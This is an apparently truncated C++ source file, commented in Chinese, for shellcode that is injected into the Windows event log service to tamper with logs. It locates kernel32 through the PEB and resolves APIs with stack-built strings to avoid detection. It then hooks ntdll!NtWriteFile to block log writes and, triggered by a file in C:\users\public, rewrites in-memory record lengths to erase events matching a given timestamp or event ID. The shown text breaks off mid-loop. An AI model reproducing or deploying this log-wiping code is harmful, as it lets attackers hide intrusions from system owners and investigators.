#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
//#include <stdio.h>

// #define DEBUG


// 写这几个全局变量只是为了帮助编译通过
// 我们会在主逻辑代码中使用malloc分配堆内存，获得准确的地址之后，使用hookfunctionaddress+固定的偏移量
// 来修复hookfunction中使用的下面这三个指针的地址
// 在shellcode中使用全局变量会导致生成的pe文件中多出来一个data分区，但是我们只提取的text分区，所以shellocde注入之后会导致access violation
DWORD* _handle_array;
DWORD64* _region_addr;
int* counter;


typedef
BOOL
(NTAPI* PNT_DeleteFileA)(
    LPCSTR lpFileName
    );

typedef
HANDLE
(NTAPI* PNT_CreateFileA)(
    LPCSTR                lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
    );

typedef
LPVOID
(NTAPI* PNT_HeapAlloc)(
    HANDLE hHeap,
    DWORD  dwFlags,
    SIZE_T dwBytes
    );
typedef
HANDLE
(NTAPI* PNT_GetProcessHeap)();


typedef
BOOL
(NTAPI* PNT_CloseHandle)(
    HANDLE       hObject
    );

typedef
BOOL
(NTAPI* PNT_ReadFile)(
    HANDLE       hFile,
    LPVOID       lpBuffer,
    DWORD        nNumberOfBytesToRead,
    LPDWORD      lpNumberOfBytesRead,
    LPOVERLAPPED lpOverlapped
    );

typedef
FARPROC
(NTAPI* PNT_GetProcAddress)(
    HMODULE hModule,
    LPCSTR  lpProcName
    );

typedef
HMODULE
(NTAPI* PNT_LoadLibraryA)(
    LPCSTR lpLibFileName
    );

typedef
HMODULE
(NTAPI* PNT_GetModuleHandleA)(
    LPCSTR lpModuleName
    );

typedef
BOOL
(NTAPI* PNT_VirtualProtect)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
    );

typedef
DWORD
(NTAPI* PNT_GetFileAttributesA)(
    LPCSTR lpFileName
    );

typedef
void
(NTAPI* PNT_Sleep)(
    DWORD dwMilliseconds
    );
 
#define TABLE_LENGTH 1024
#define TO_LOWERCASE(out, c1) (out = (c1 <= 'Z' && c1 >= 'A') ? c1 = (c1 - 'A') + 'a': c1)

LRESULT HookedSendMessageW(
    HANDLE           FileHandle,
    HANDLE           Event,
    PIO_APC_ROUTINE  ApcRoutine,
    PVOID            ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID            Buffer,
    ULONG            Length,
    PLARGE_INTEGER   ByteOffset,
    PULONG           Key
) {
    // 只有buffer包含魔术字符串才有必要录入，其他的直接舍弃
    if(0x2a2a0000!=  *(reinterpret_cast<DWORD*>(Buffer))) return STATUS_SUCCESS;
    int flag = 0;
    // 我可能需要手动修正这两个数组的地址
    // 关键是怎么修正啊，妈的好难啊
    for (int i = 0; i < 500; i++) {
        // 为了节省时间，我们没必要遍历完，碰到为0，说明已经遍历完了，直接出去就行了
       if (_handle_array[i] == 0)break;
        if ((DWORD)FileHandle == _handle_array[i]) {
            flag = 1; break;
        }
    }
    // 之前没有见过的handle
    if (!flag) {
        _handle_array[*counter] = (DWORD)FileHandle;
        // 把地址值转换成DWORD64
        _region_addr[*counter] = reinterpret_cast<DWORD64>(Buffer);
        *counter = *counter + 1;
    }
    // 我们只需要判断第一个filehandle就行了
    // 或者我们直接啥都不干，就是不让他写文件，什么文件都不让写，我们就直接给他返回STATUS_SUCCESS 
    return STATUS_SUCCESS;
}

inline LPVOID get_func_by_name(LPVOID module, char* func_name)
{
    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return nullptr;
    }
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
    IMAGE_DATA_DIRECTORY* exportsDir = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    if (!exportsDir->VirtualAddress) {
        return nullptr;
    }

    DWORD expAddr = exportsDir->VirtualAddress;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(expAddr + (ULONG_PTR)module);
    SIZE_T namesCount = exp->NumberOfNames;

    DWORD funcsListRVA = exp->AddressOfFunctions;
    DWORD funcNamesListRVA = exp->AddressOfNames;
    DWORD namesOrdsListRVA = exp->AddressOfNameOrdinals;

    //go through names:
    for (SIZE_T i = 0; i < namesCount; i++) {
        DWORD* nameRVA = (DWORD*)(funcNamesListRVA + (BYTE*)module + i * sizeof(DWORD));
        WORD* nameIndex = (WORD*)(namesOrdsListRVA + (BYTE*)module + i * sizeof(WORD));
        DWORD* funcRVA = (DWORD*)(funcsListRVA + (BYTE*)module + (*nameIndex) * sizeof(DWORD));

        LPSTR curr_name = (LPSTR)(*nameRVA + (BYTE*)module);
        size_t k;
        for (k = 0; func_name[k] != 0 && curr_name[k] != 0; k++) {
            if (func_name[k] != curr_name[k]) break;
        }
        if (func_name[k] == 0 && curr_name[k] == 0) {
            //found
            return (BYTE*)module + (*funcRVA);
        }
    }
    return nullptr;
}


inline bool _compare_kernel32_name(WORD len, WCHAR* dll_name) {
    // 我们只需要定位kernel32，直接作为char处理即可
    // wchar的话，对于英文字符串，就是一个char一个0，结束符为两个0
    // len/2就是实际长度（不包括\0）,kernel32.dll长度就是12
    char DTwew[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
    if (len / 2 != 12)return false;
    for (int i = 0; i < len / 2; i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != DTwew[i])return false;
    }
    return true;
}


inline bool _compare_psapi_name(WORD len, WCHAR* dll_name) {
    // 我们只需要定位kernel32，直接作为char处理即可
    // wchar的话，对于英文字符串，就是一个char一个0，结束符为两个0
    // len/2就是实际长度（不包括\0）,kernel32.dll长度就是12
    char DTwew[] = { 'p','s','a','p','i','.','d','l','l',0 };
    if (len / 2 != 9)return false;
    for (int i = 0; i < len / 2; i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != DTwew[i])return false;
    }
    return true;
}


inline bool _compare_lsass_name(char* dll_name) {
    // char oyctO[] = { 'l','s','a','s','s','.','e','x','e',0 }; 
    char oyctO[] = { 'i','m','m','3','2','.','d','l','l',0 };
    for (int i = 0; (dll_name[i] != 0) && (i < 9); i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != oyctO[i])return false;
    }
    return true;
}

inline DWORD64 _return_hex_value(char _hex_char) {
    if (_hex_char == '0') {
        return 0;
    }
    if (_hex_char == '1') {
        return 1;
    }
    if (_hex_char == '2') {
        return 2;
    }
    if (_hex_char == '3') {
        return 3;
    }
    if (_hex_char == '4') {
        return 4;
    }
    if (_hex_char == '5') {
        return 5;
    }
    if (_hex_char == '6') {
        return 6;
    }
    if (_hex_char == '7') {
        return 7;
    }
    if (_hex_char == '8') {
        return 8;
    }
    if (_hex_char == '9') {
        return 9;
    }
    if (_hex_char == 'a') {
        return 10;
    }
    if (_hex_char == 'b') {
        return 11;
    }
    if (_hex_char == 'c') {
        return 12;
    }
    if (_hex_char == 'd') {
        return 13;
    }
    if (_hex_char == 'e') {
        return 14;
    }
    if (_hex_char == 'f') {
        return 15;
    }

}

inline bool _compare_lsasrv_name(char* dll_name) {
    // char zGlRm[] = { 'l','s','a','s','r','v','.','d','l','l',0 }; 
    char zGlRm[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
    // for (int i = 0; (dll_name[i] != 0) && (i < 10); i++) {
    for (int i = 0; (dll_name[i] != 0) && (i < 12); i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != zGlRm[i])return false;
    }
    return true;
    //TO_LOWERCASE
}



int main() {
    /*if (_handle_array[0] == 0) {
        int asd = 0;
    }*/
    // 读取gs寄存器的值获取到当前进程的peb
    DWORD64 _peb = __readgsqword(0x60);
    // 往后偏移0x18得到&ldr
    DWORD64 _p_ldr = _peb + 0x18;
    // 取出ldr的地址
    DWORD64 _ldr = *(reinterpret_cast<DWORD64*>(_p_ldr));
    // 往后偏移0x10得到&InLoadOrderModuleList
    DWORD64 _p_InLoadOrderModuleList = _ldr + 0x10;
    // 取出InLoadOrderModuleList地址
    DWORD64 _InLoadOrderModuleList = *(reinterpret_cast<DWORD64*>(_p_InLoadOrderModuleList));
    // 这个地址是_LDR_DATA_TABLE_ENTRY的第一个字段的地址，也就是_LDR_DATA_TABLE_ENTRY的地址
    // 记录下这个地址，然后开始遍历，直到flink=记录下来的地址
    // 遍历module
    // 实际测试发现这个链表有一个头结点，头结点中不保存实际数据，除了flink和blink，其余字段都是空的
    // 我们要在遍历过程中对dll名称进行对比，由于我们要编写shellcode，所以不能使用任何库函数，只能自己实现

    DWORD64 _entry_addr = _InLoadOrderModuleList;
    DWORD64 _kernel32_base_addr = 0;
    DWORD64 _psapi_base_addr = 0;
    while (1) {
        // 获取dll名称，0x58
        DWORD64 _dll_name = _entry_addr + 0x58;
        UNICODE_STRING* dll_name = reinterpret_cast<UNICODE_STRING*>(_dll_name);
        //wprintf(L"dll name: %s\n", dll_name->Buffer);
        // 获取dllbase地址，0x30
        DWORD64 _p_dll_base = _entry_addr + 0x30;
        DWORD64 _dll_base = *(reinterpret_cast<DWORD64*>(_p_dll_base));

#ifdef DEBUG

        if (0 == reinterpret_cast<DWORD64*>(_dll_base)) {
            MessageBoxA(NULL, "OK", "OK", MB_OK);
        }
        printf("base address: %p\n", reinterpret_cast<DWORD64*>(_dll_base));
#endif // DEBUG

        if ((dll_name->Length != 0) && (_compare_kernel32_name(dll_name->Length, dll_name->Buffer))) {
            _kernel32_base_addr = _dll_base;
        }
        if ((dll_name->Length != 0) && (_compare_psapi_name(dll_name->Length, dll_name->Buffer))) {
            _psapi_base_addr = _dll_base;
        }
        // 获取flink
        _entry_addr = *(reinterpret_cast<DWORD64*>(_entry_addr));
        if (_InLoadOrderModuleList == _entry_addr) break;

    }
    //if (_kernel32_base_addr) {
    //    printf("kernel32.dll located, base address: %p\n", reinterpret_cast<DWORD64*>(_kernel32_base_addr));
    //}

    // 获取到kernel32的基地址之后需要获取其导出表，来定位我们需要用到的api
    // 我们需要解析kernel32.dll的PE结构
    // 这里我直接用了网上现成的代码
    // 把kernel32的基地址传上去，把想要获取的函数名称传上去即可
    char stack_string[50] = { 0 };
    stack_string[0] = 'L'; stack_string[1] = 'o'; stack_string[2] = 'a'; stack_string[3] = 'd'; stack_string[4] = 'L'; stack_string[5] = 'i'; stack_string[6] = 'b'; stack_string[7] = 'r'; stack_string[8] = 'a'; stack_string[9] = 'r'; stack_string[10] = 'y'; stack_string[11] = 'A';
    VOID* _LoadLibraryA_addr = get_func_by_name(reinterpret_cast<LPVOID>(_kernel32_base_addr), stack_string);
    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'G'; stack_string[1] = 'e'; stack_string[2] = 't'; stack_string[3] = 'P'; stack_string[4] = 'r'; stack_string[5] = 'o'; stack_string[6] = 'c'; stack_string[7] = 'A'; stack_string[8] = 'd'; stack_string[9] = 'd'; stack_string[10] = 'r'; stack_string[11] = 'e'; stack_string[12] = 's'; stack_string[13] = 's';
    VOID* _GetProcAddress_addr = get_func_by_name(reinterpret_cast<LPVOID>(_kernel32_base_addr), stack_string);


    PNT_LoadLibraryA NT_LoadLibraryA = (PNT_LoadLibraryA)_LoadLibraryA_addr;
    PNT_GetProcAddress NT_GetProcAddress = (PNT_GetProcAddress)_GetProcAddress_addr;



    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'G'; stack_string[1] = 'e'; stack_string[2] = 't'; stack_string[3] = 'M'; stack_string[4] = 'o'; stack_string[5] = 'd'; stack_string[6] = 'u'; stack_string[7] = 'l'; stack_string[8] = 'e'; stack_string[9] = 'H'; stack_string[10] = 'a'; stack_string[11] = 'n'; stack_string[12] = 'd'; stack_string[13] = 'l'; stack_string[14] = 'e'; stack_string[15] = 'A';
    PNT_GetModuleHandleA NT_GetModuleHandleA = (PNT_GetModuleHandleA)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);

    // 获取ntdll!NtWriteFile函数的地址
    HMODULE fuckyouhandle = NT_GetModuleHandleA("ntdll.dll");
    void* funcAddress = NT_GetProcAddress(fuckyouhandle, "NtWriteFile");

    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'V'; stack_string[1] = 'i'; stack_string[2] = 'r'; stack_string[3] = 't'; stack_string[4] = 'u'; stack_string[5] = 'a'; stack_string[6] = 'l'; stack_string[7] = 'P'; stack_string[8] = 'r'; stack_string[9] = 'o'; stack_string[10] = 't'; stack_string[11] = 'e'; stack_string[12] = 'c'; stack_string[13] = 't';
    PNT_VirtualProtect NT_VirtualProtect = (PNT_VirtualProtect)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);

    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'H'; stack_string[1] = 'e'; stack_string[2] = 'a'; stack_string[3] = 'p'; stack_string[4] = 'A'; stack_string[5] = 'l'; stack_string[6] = 'l'; stack_string[7] = 'o'; stack_string[8] = 'c';
    PNT_HeapAlloc NT_HeapAlloc = (PNT_HeapAlloc)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);

    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'G'; stack_string[1] = 'e'; stack_string[2] = 't'; stack_string[3] = 'P'; stack_string[4] = 'r'; stack_string[5] = 'o'; stack_string[6] = 'c'; stack_string[7] = 'e'; stack_string[8] = 's'; stack_string[9] = 's'; stack_string[10] = 'H'; stack_string[11] = 'e'; stack_string[12] = 'a'; stack_string[13] = 'p';
    PNT_GetProcessHeap NT_GetProcessHeap = (PNT_GetProcessHeap)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);

    
    // 修改ntdll!NtWriteFile函数的地址的前0x10字节为可读写，因为我们只需要修改13字节，所以0x10足够了
    DWORD oldProtection;
    DWORD newProtection = PAGE_EXECUTE_READWRITE;
    //MessageBoxA(NULL, "OK", "OK", MB_OK);
    BOOL fuck = NT_VirtualProtect(funcAddress, 0x10, newProtection, &oldProtection);
    //printf("%d\n", fuck);


    //MessageBoxA(NULL, "OK", "OK", MB_OK);MessageBoxA(NULL, "OK", "OK", MB_OK);
    // 现在我们已经拿到了hook函数的地址，我们可以先build程序，然后在ida中获取hook函数中使用的那三个指针出现的位置（偏移量）
    // 这里的偏移量指的是相对于hook函数开头的偏移量
    // 然后我们使用malloc动态分配的内存空间地址来替换掉hook函数中三个指针的内存地址
    // 当然我们不能简单粗暴的替换，因为指令中的地址实际上是通过rip+偏移量来计算出来的，比如下面这条指令
    // 488d0dd21f0000  lea     rcx,[000001f6`b6262000]
    // 000001f6`b6262000是由rip+1fd2计算出来的，前面的488d0d是lea rcx
    /*分析过程
    https://github.com/wqreytuk/windows_event_log_study/blob/main/%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B.asm
    */
    void* hookedFunctionAddr = &HookedSendMessageW;
    DWORD64 _hook_addr = reinterpret_cast<DWORD64>(hookedFunctionAddr);
    
    HANDLE _heap_handle = NT_GetProcessHeap();

    DWORD* _real_handle_array = (DWORD*)NT_HeapAlloc(_heap_handle, HEAP_ZERO_MEMORY, 4 * 500);
    DWORD64* _real_region_addr = (DWORD64*)NT_HeapAlloc(_heap_handle, HEAP_ZERO_MEMORY, 8 * 500);
    DWORD* _real_counter = (DWORD*)NT_HeapAlloc(_heap_handle, HEAP_ZERO_MEMORY, 4);

    // 我们还需要开辟3个QWORD来存储上面3个地址的地址
    DWORD64* _p_to_real_handle_array = (DWORD64*)NT_HeapAlloc(_heap_handle, HEAP_ZERO_MEMORY, 8);
    DWORD64* _p_to__real_region_addr = (DWORD64*)NT_HeapAlloc(_heap_handle, HEAP_ZERO_MEMORY, 8);
    DWORD64* _p_to_real_counter = (DWORD64*)NT_HeapAlloc(_heap_handle, HEAP_ZERO_MEMORY, 8);

    // 给上面这3个指针赋值
    *_p_to_real_handle_array = reinterpret_cast<DWORD64>(_real_handle_array);
    *_p_to__real_region_addr = reinterpret_cast<DWORD64>(_real_region_addr);
    *_p_to_real_counter = reinterpret_cast<DWORD64>(_real_counter);

    // 下面我们来依次修正这三个指针在hookedFunctionAddr中的地址
    // _handle_array的偏移
    /*
    * 0x52
    * 0x65
    * 0x92
    */
    DWORD _temp_offset_to_rip = (char*)_p_to_real_handle_array - ((char*)hookedFunctionAddr + 0x52 + 7);
    *(DWORD*)((char*)hookedFunctionAddr + 0x52 + 3) = _temp_offset_to_rip;
     _temp_offset_to_rip = (char*)_p_to_real_handle_array - ((char*)hookedFunctionAddr + 0x65 + 7);
    *(DWORD*)((char*)hookedFunctionAddr + 0x65 + 3) = _temp_offset_to_rip;
     _temp_offset_to_rip = (char*)_p_to_real_handle_array - ((char*)hookedFunctionAddr + 0x92 + 7);
    *(DWORD*)((char*)hookedFunctionAddr + 0x92 + 3) = _temp_offset_to_rip;

    // _region_addr的偏移
    /*
    * 0xaa
    */
     _temp_offset_to_rip = (char*)_p_to__real_region_addr - ((char*)hookedFunctionAddr + 0xaa + 7);
    *(DWORD*)((char*)hookedFunctionAddr + 0xaa + 3) = _temp_offset_to_rip;

    // counter的偏移
    /*
    * 0x88
    * 0xa0
    * 0xba
    * 0xc5
    */
    _temp_offset_to_rip = (char*)_p_to_real_counter - ((char*)hookedFunctionAddr + 0x88 + 7);
    *(DWORD*)((char*)hookedFunctionAddr + 0x88 + 3) = _temp_offset_to_rip;
    _temp_offset_to_rip = (char*)_p_to_real_counter - ((char*)hookedFunctionAddr + 0xa0 + 7);
    *(DWORD*)((char*)hookedFunctionAddr + 0xa0 + 3) = _temp_offset_to_rip;
    _temp_offset_to_rip = (char*)_p_to_real_counter - ((char*)hookedFunctionAddr + 0xba + 7);
    *(DWORD*)((char*)hookedFunctionAddr + 0xba + 3) = _temp_offset_to_rip;
    _temp_offset_to_rip = (char*)_p_to_real_counter - ((char*)hookedFunctionAddr + 0xc5 + 7);
    *(DWORD*)((char*)hookedFunctionAddr + 0xc5 + 3) = _temp_offset_to_rip;


    // 先往里面写入 mov rax
    BYTE caonimade[2] = { 0x48,0xb8 };
    // NT_CopyMemory((char*)funcAddress, caonimade, 2);
     //CopyMemory((char*)funcAddress, caonimade, 2);
    ((char*)funcAddress)[0] = caonimade[0];
    ((char*)funcAddress)[1] = caonimade[1];
    // 写入地址
    //CopyMemory((char*)funcAddress + 2, &_hook_addr, 8);

    ((char*)funcAddress)[2] = ((char*)&_hook_addr)[0];
    ((char*)funcAddress)[3] = ((char*)&_hook_addr)[1];
    ((char*)funcAddress)[4] = ((char*)&_hook_addr)[2];
    ((char*)funcAddress)[5] = ((char*)&_hook_addr)[3];

    ((char*)funcAddress)[6] = ((char*)&_hook_addr)[4];
    ((char*)funcAddress)[7] = ((char*)&_hook_addr)[5];
    ((char*)funcAddress)[8] = ((char*)&_hook_addr)[6];
    ((char*)funcAddress)[9] = ((char*)&_hook_addr)[7];
    // jmp rax
    BYTE array3123123123[2] = { 0xff, 0xe0 };
    //CopyMemory((char*)funcAddress + 2 + 8, array3123123123, 2);
    ((char*)funcAddress)[10] = array3123123123[0];
    ((char*)funcAddress)[11] = array3123123123[1];
    //MessageBoxA(NULL, "OK", "OK", MB_OK);



    // 现在我们已经hook了ntwritefile，也就意味着我们可以获取要写入的内容
    // 通过检测魔术字符串**，我们可以搜集不同handle的事件内存区域
    // eventlog服务需要写入的日志文件不超过500个，因此我们直接声明一个500的数组用来存放handle
    // 另外500个数组用来存放区域地址
    // 每次我们都需要遍历一次handle数组，如果是没有出现过的handle，就把内存handle和内存地址都添加进去
    // 我们需要通过检测某个文件是否出现来直到是否要启动日志清除工作
    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'G'; stack_string[1] = 'e'; stack_string[2] = 't'; stack_string[3] = 'F'; stack_string[4] = 'i'; stack_string[5] = 'l'; stack_string[6] = 'e'; stack_string[7] = 'A'; stack_string[8] = 't'; stack_string[9] = 't'; stack_string[10] = 'r'; stack_string[11] = 'i'; stack_string[12] = 'b'; stack_string[13] = 'u'; stack_string[14] = 't'; stack_string[15] = 'e'; stack_string[16] = 's'; stack_string[17] = 'A';
    PNT_GetFileAttributesA NT_GetFileAttributesA = (PNT_GetFileAttributesA)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);

    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'S'; stack_string[1] = 'l'; stack_string[2] = 'e'; stack_string[3] = 'e'; stack_string[4] = 'p';
    PNT_Sleep NT_Sleep = (PNT_Sleep)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);


    // 首先要从kernel32中获取CreateFileA/ReadFile
    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'C'; stack_string[1] = 'r'; stack_string[2] = 'e'; stack_string[3] = 'a'; stack_string[4] = 't'; stack_string[5] = 'e'; stack_string[6] = 'F'; stack_string[7] = 'i'; stack_string[8] = 'l'; stack_string[9] = 'e'; stack_string[10] = 'A';
    PNT_CreateFileA NT_CreateFileA = (PNT_CreateFileA)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'R'; stack_string[1] = 'e'; stack_string[2] = 'a'; stack_string[3] = 'd'; stack_string[4] = 'F'; stack_string[5] = 'i'; stack_string[6] = 'l'; stack_string[7] = 'e';
    PNT_ReadFile NT_ReadFile = (PNT_ReadFile)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);


    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'C'; stack_string[1] = 'l'; stack_string[2] = 'o'; stack_string[3] = 's'; stack_string[4] = 'e'; stack_string[5] = 'H'; stack_string[6] = 'a'; stack_string[7] = 'n'; stack_string[8] = 'd'; stack_string[9] = 'l'; stack_string[10] = 'e';
    PNT_CloseHandle NT_CloseHandle = (PNT_CloseHandle)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);

    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\';stack_string[3]='u';stack_string[4]='s';stack_string[5]='e';stack_string[6]='r';stack_string[7]='s';stack_string[8]='\\';stack_string[9]='p';stack_string[10]='u';stack_string[11]='b';stack_string[12]='l';stack_string[13]='i';stack_string[14]='c';stack_string[15]='\\';stack_string[16]='m';stack_string[17]='i';stack_string[18]='a';stack_string[19]='l';
    while (1) {
        DWORD dwAttrib = NT_GetFileAttributesA(stack_string);
        if ((dwAttrib != INVALID_FILE_ATTRIBUTES &&
            !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY))) {
            // 来活了
            // 首先解析文件，获得里面保存的时间戳和eventid

            // 获取文件句柄
            HANDLE hFile = NT_CreateFileA(stack_string,               // file to open
                GENERIC_READ,          // open for reading
                FILE_SHARE_READ,       // share for reading
                NULL,                  // default security
                OPEN_EXISTING,         // existing file only
                FILE_ATTRIBUTE_NORMAL, // normal file
                NULL);
            if (INVALID_HANDLE_VALUE == hFile)  return 0;
            // 读取文件
            SecureZeroMemory(stack_string, 50);
            DWORD out = 0;
            if (NT_ReadFile(hFile,
                stack_string,
                50,
                &out,
                NULL
            ) == FALSE)
                return 0;

            // 关闭文件句柄
            NT_CloseHandle(hFile);
            DWORD64 _time_stamp =
                _return_hex_value(stack_string[0]) << 60;
            _time_stamp +=
                _return_hex_value(stack_string[1]) << 56;
            _time_stamp +=
                _return_hex_value(stack_string[2]) << 52;
            _time_stamp +=
                _return_hex_value(stack_string[3]) << 48;
            _time_stamp +=
                _return_hex_value(stack_string[4]) << 44;
            _time_stamp +=
                _return_hex_value(stack_string[5]) << 40;
            _time_stamp +=
                _return_hex_value(stack_string[6]) << 36;
            _time_stamp +=
                _return_hex_value(stack_string[7]) << 32;
            _time_stamp +=
                _return_hex_value(stack_string[8]) << 28;
            _time_stamp +=
                _return_hex_value(stack_string[9]) << 24;
            _time_stamp +=
                _return_hex_value(stack_string[10]) << 20;
            _time_stamp +=
                _return_hex_value(stack_string[11]) << 16;
            _time_stamp +=
                _return_hex_value(stack_string[12]) << 12;
            _time_stamp +=
                _return_hex_value(stack_string[13]) << 8;
            _time_stamp +=
                _return_hex_value(stack_string[14]) << 4;
            _time_stamp +=
                _return_hex_value(stack_string[15]);

            DWORD64 _event_id =
                _return_hex_value(stack_string[16]) << 28;
            _event_id +=
                _return_hex_value(stack_string[17]) << 24;
            _event_id +=
                _return_hex_value(stack_string[18]) << 20;
            _event_id +=
                _return_hex_value(stack_string[19]) << 16;
            _event_id +=
                _return_hex_value(stack_string[20]) << 12;
            _event_id +=
                _return_hex_value(stack_string[21]) << 8;
            _event_id +=
                _return_hex_value(stack_string[22]) << 4;
            _event_id +=
                _return_hex_value(stack_string[23]);

            // 通过遍历区域数组中每个地址，我们可以定位到所有的record
            /*
_real_handle_array 	
_real_region_addr 	
_real_counter 		
            */
            bool _got_matched = 0;
            for (int i = 0;; i++) {
                if (_real_region_addr[i] == 0)break;
                DWORD64 _init_addr = _real_region_addr[i];
                for (;;) {
                    // _init_addr-4取出一个DWORD即可获得上一个节点的长度 len
                    // 用_init_addr-len即可得到上一个recrod的地址
                    // _init_addr+4取出一个dword即可获得当前节点的长度len
                    // 用_init_addr+len即可获得下一个节点的地址
                    // 判断forward和backward是否结束的标志就是节点地址取DWORD，如果值不是0x2a2a0000，就结束

                    // 前向遍历
                    DWORD64 _current_record = _init_addr;
                    for (;;) {
                        if (0x2a2a0000 != *(reinterpret_cast<DWORD*>(_current_record))) break;


                        DWORD _len = *(reinterpret_cast<DWORD*>(_current_record + 4));
                        // 获取eventid
                        DWORD64 _EventRecordID = *(reinterpret_cast<DWORD64*>(_current_record + 8));
                        // 获取时间戳
                        DWORD64 _TimeCreated = *(reinterpret_cast<DWORD64*>(_current_record + 16));

                        // 进行判断
                        // 如果时间戳为0则不判断时间戳
                        BOOL _already_deleted = 0;
                        if (_time_stamp) {
                            // 大于指定时间戳的日志不要
                            if (_TimeCreated > _time_stamp) {
                                _got_matched = 1;
                                _already_deleted = 1;
                                // 关于删除节点，我的想法就是把前一个节点的第一个len字段值_pre_len设置为_pre_len+_cur_len
                                // 把当前节点的最后一个len字段也设置为_pre_len+_cur_len，这样在遍历的时候就会忽略掉当前节点
                                // 不过首先要判断当前节点是不是第一个节点
                                
                                // 如果前面一个节点是有效节点，则修改前一个节点的第一个len字段
                                if (0x2a2a0000 == *(reinterpret_cast<DWORD*>(_current_record - _len)) &&
                                    0x2a2a0000 == *(reinterpret_cast<DWORD*>(_current_record + _len))) {
                                    DWORD _pre_len = *(reinterpret_cast<DWORD*>(_current_record - _len + 4));
                                    // 修改前一个节点第一个len字段的值
                                    *reinterpret_cast<DWORD*>(_current_record - _len + 4) = _pre_len + _len;
                                    // 修改当前节点最后一个len字段的值
                                    *(reinterpret_cast<DWORD*>(_current_record + _len - 4)) = _pre_len + _len;
                                }

                            }
                        }
                        // 如果eventid为0，则不判断eventid
                        if (!_already_deleted&&_event_id) {
                            // 等于指定eventid的日志不要
                            if (_EventRecordID == _event_id) {
                                _got_matched = 1;
                                _already_deleted = 1;
                                // 关于删除节点，我的想法就是把前一个节点的第一个len字段值_pre_len设置为_pre_len+_cur_len
                                // 把当前节点的最后一个len字段也设置为_pre_len+_cur_len，这样在遍历的时候就会忽略掉当前节点
                                // 不过首先要判断当前节点是不是第一个节点，而且也不能是最后一个节点

                                // 如果前面一个节点是有效节点，则修改前一个节点的第一个len字段
                                if (0x2a2a0000 == *(reinterpret_cast<DWORD*>(_current_record - _len)) &&
                                    0x2a2a0000 == *(reinterpret_cast<DWORD*>(_current_record + _len))) {
                                    DWORD _pre_len = *(reinterpret_cast<DWORD*>(_current_record - _len + 4));
                                    // 修改前一个节点第一个len字段的值
                                    *reinterpret_cast<DWORD*>(_current_record - _len + 4) = _pre_len + _len;
                                    // 修改当前节点最后一个len字段的值
                                    *(reinterpret_cast<DWORD*>(_current_record + _len - 4)) = _pre_len + _len;
                                }
                            }
                        }

                        // 获取前一个节点的地址
                        _current_record = _current_record - _len;
                    }

                    // _init_addr在前面已经被检测过了，这里直接跳过
                    _current_record = _init_addr + *(reinterpret_cast<DWORD*>(_init_addr + 4));
                    // 后向遍历
                    for (;;) {
                        if (0x2a2a0000 != *(reinterpret_cast<DWORD*>(_current_record))) break;


                        DWORD _len = *(reinterpret_cast<DWORD*>(_current_record + 4));
                        // 获取eventid
                        DWORD64 _EventRecordID = *(reinterpret_cast<DWORD64*>(_current_record + 8));
                        // 获取时间戳
                        DWORD64 _TimeCreated = *(reinterpret_cast<DWORD64*>(_current_record + 16));

                        // 进行判断
                        // 如果时间戳为0则不判断时间戳
                        BOOL _already_deleted = 0;
                        if (_time_stamp) {
                            // 大于指定时间戳的日志不要
                            if (_TimeCreated > _time_stamp) {
                                _already_deleted = 1;
                                // 关于删除节点，我的想法就是把前一个节点的第一个len字段值_pre_len设置为_pre_len+_cur_len
                                // 把当前节点的最后一个len字段也设置为_pre_len+_cur_len，这样在遍历的时候就会忽略掉当前节点
                                if (0x2a2a0000 == *(reinterpret_cast<DWORD*>(_current_record - _len)) &&
                                    0x2a2a0000 == *(reinterpret_cast<DWORD*>(_current_record + _len))) {
                                    DWORD _pre_len = *(reinterpret_cast<DWORD*>(_current_record - _len + 4));
                                    // 修改前一个节点第一个len字段的值
                                    *reinterpret_cast<DWORD*>(_current_record - _len + 4) = _pre_len + _len;
                                    // 修改当前节点最后一个len字段的值
                                    *(reinterpret_cast<DWORD*>(_current_record + _len - 4)) = _pre_len + _len;
                                }
                            }
                        }
                        // 如果eventid为0，则不判断eventid
